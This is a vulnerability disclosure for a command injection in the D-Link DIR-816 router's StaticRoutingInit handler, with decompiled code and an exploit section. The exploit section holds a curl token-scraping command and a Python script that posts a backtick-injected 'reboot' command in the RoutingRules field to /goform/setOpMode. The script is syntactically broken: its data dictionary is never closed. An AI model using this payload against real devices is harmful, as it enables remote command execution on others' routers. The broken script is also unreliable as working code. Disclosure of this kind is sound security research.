## DIR-816 Command Injection

### Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ：https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816

### Affected version

D-Link DIR-816  A2V1.1.0B05 was found to contain a command injection in `StaticRoutingInit` of the component Web Interface, which allows remote attackers to execute arbitrary commands via shell.

![image-20250310195139787](./img/1.png)

### Vulnerability details

If attackers access the path like`/goform/setMAC`, `/goform/setOpMode` and `/goform/wizard_end`, the server will call the `StaticRoutingInit` function. In this function, Attackers can control `v5` by setting the `RoutingRules`, then passed its value to `v13` and `v14`, finally call the `dosystem`.

```
    ...
    fclose(v3);
    result = websGetVar(a1, "RoutingRules", 0);
    v5 = result;
	...
        for ( result = getNthValueSafe(0, v5, 59, v13, 256); result != -1; result = getNthValueSafe(
	...
          if ( getNthValueSafe(0, v13, 44, v14, 32) == -1
            || getNthValueSafe(1, v13, 44, v15, 32) == -1
            || getNthValueSafe(2, v13, 44, v16, 32) == -1
            || getNthValueSafe(3, v13, 44, v17, 32) == -1
            || getNthValueSafe(4, v13, 44, v18, 32) == -1
            || getNthValueSafe(5, v13, 44, v19, 32) == -1
            || getNthValueSafe(6, v13, 44, v20, 32) == -1 )
          {
            ++v6;
          }
          else
          {
            strcpy(v21, "route add ");
            if ( !strcmp(v15, "255.255.255.255") )
              v12 = "-host ";
            else
              v12 = "-net ";
            strcat(v21, v12);
            strcat(v21, v14);
            strcat(v21, " ");
            if ( strcmp(v15, "255.255.255.255") )
              sprintf(v21, "%s netmask %s", v21, v15);
            if ( v16[0] && strcmp(v16, "0.0.0.0") )
              sprintf(v21, "%s gw %s", v21, v16);
            sprintf(v21, "%s dev %s ", v21, v18);
            strcat(v21, "2>&1 ");
            if ( !strcmp(v17, "WAN") && !v1 )
            {
              printf("Skip WAN routing rule in the non-Gateway mode: %s\n", v21);
              ++v6;
            }
            else
            {
              doSystem(v21);
              ++v6;
            }
```

Based on the cause of the vulnerability, attackers can arbitrarily execute the command by setting the `RoutingRules`.

### EXP

First, attackers need to get the token ID.

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Then, run exp.

```
import requests

tokenid = ''

url = 'http://192.168.0.1/goform/setOpMode'

data = {
    'tokenid': tokenid,
    'RoutingRules': {"net": "foo`reboot`bar", "destination": "255.255.255.255", "gateway": "192.168.0.1", "mask": "255.255.255.0"}

r = requests.post(url, data)
```
